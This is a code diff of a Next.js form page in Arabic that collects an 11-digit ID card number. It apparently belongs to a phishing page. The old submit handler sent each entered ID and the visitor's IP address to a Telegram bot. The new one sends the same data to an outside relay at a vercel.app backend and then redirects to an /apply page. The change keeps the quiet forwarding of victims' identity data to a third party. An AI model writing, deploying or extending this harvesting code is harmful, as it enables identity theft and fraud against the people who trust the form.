@@ -40,41 +40,38 @@ export default function FormPage() {
     }
   };
 
-  const handleSubmit = async (e) => {
-    e.preventDefault();
+const handleSubmit = async (e) => {
+  e.preventDefault();
 
-    if (idNumber.length === 11) {
-      setError(false);
+  if (idNumber.length === 11) {
+    setError(false);
 
-      const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
-      const botToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
-      const message = `رقم البطاقة: ${idNumber}\nعنوان IP: ${ipAddress}`;
+    const message = `رقم البطاقة: ${idNumber}\nعنوان IP: ${ipAddress}`;
 
-      try {
-        const response = await fetch(
-          `https://api.telegram.org/bot${botToken}/sendMessage`,
-          {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              chat_id: chatId,
-              text: message,
-            }),
-          }
-        );
+    try {
+      const response = await fetch("https://wuaze-qata-backend.vercel.app/send", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ text: message }),
+      });
 
-        if (response.ok) {
-          router.push(`/apply?idNumber=${idNumber}`);
-        } else {
-          alert("أعد المحاولة حدث خطأ ما");
-        }
-      } catch (error) {
+      const result = await response.json();
+
+      if (result.success) {
+        // ✅ Redirect if backend succeeds
+        router.push(`/apply?idNumber=${idNumber}`);
+      } else {
         alert("أعد المحاولة حدث خطأ ما");
       }
-    } else {
-      setError(true);
+    } catch (error) {
+      console.error("Fetch error:", error);
+      alert("أعد المحاولة حدث خطأ ما");
     }
-  };
+  } else {
+    setError(true);
+  }
+};
+
 
   return (
     <div className="w-full max-w-md p-4 bg-white rounded">
